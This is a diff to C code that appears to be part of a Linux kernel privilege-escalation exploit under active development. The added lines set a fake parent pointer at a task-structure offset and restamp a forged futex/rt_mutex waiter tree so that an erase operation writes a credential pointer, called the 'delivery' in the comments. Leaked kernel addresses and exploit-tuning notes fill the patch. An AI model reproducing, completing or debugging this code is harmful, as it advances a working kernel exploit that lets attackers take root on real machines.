@@ -442,6 +442,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             tgt_task = jc2_self_task_leak();
           g_main_pc = ((uint64_t)(tgt_task + 0x778)) | 1ULL;
           g_main_left = (uint64_t)g_child_cred;
+          g_cc_parent = (uintptr_t)(tgt_task + 0x778);
           pr_info("JC2 CAPSONLY v2 CC: pc=%016llx (task+0x778|RED) "
                   "left=%016llx (VALUE=cred)\n",
                   (unsigned long long)g_main_pc,
@@ -550,8 +551,15 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * wedge class). Only the exact delta roots the tree at the ghost. */
         ghost_lock_word = g_ghost_kva + 0x50;
         ex_stamp[0] = 0;            /* word10 wait_lock: unlocked      */
-        ex_stamp[1] = g_ghost_kva;  /* word11 waiters root = ghost     */
-        ex_stamp[2] = g_ghost_kva;  /* word12 waiters leftmost = ghost */
+        /* REQUEUE CONSISTENCY (b7e94d3 decode): root=ghost left the tree
+         * inconsistent after the erase (ghost unlinked via the fake
+         * parent task+0x778 while root still named ghost) — the requeue
+         * insert then self-walked. Root = the SAME fake parent the CC
+         * shape uses for delivery: erase unlinks ghost from parent
+         * (store *(parent+8)=cred = the delivery), root stays = parent,
+         * requeue reinserts under the parent — tree consistent. */
+        ex_stamp[1] = (uint64_t)g_cc_parent; /* word11 root = fake parent */
+        ex_stamp[2] = g_ghost_kva;  /* word12 leftmost = ghost (top)   */
         /* owner MUST be >1: the chain exits at owner<=1 BEFORE the
          * delivery erase (historic util.c note: "exits at owner<=1
          * (0x1ee2cc)"). fake_task|1 = the MODE4_OWNER_TASK-proven shape:
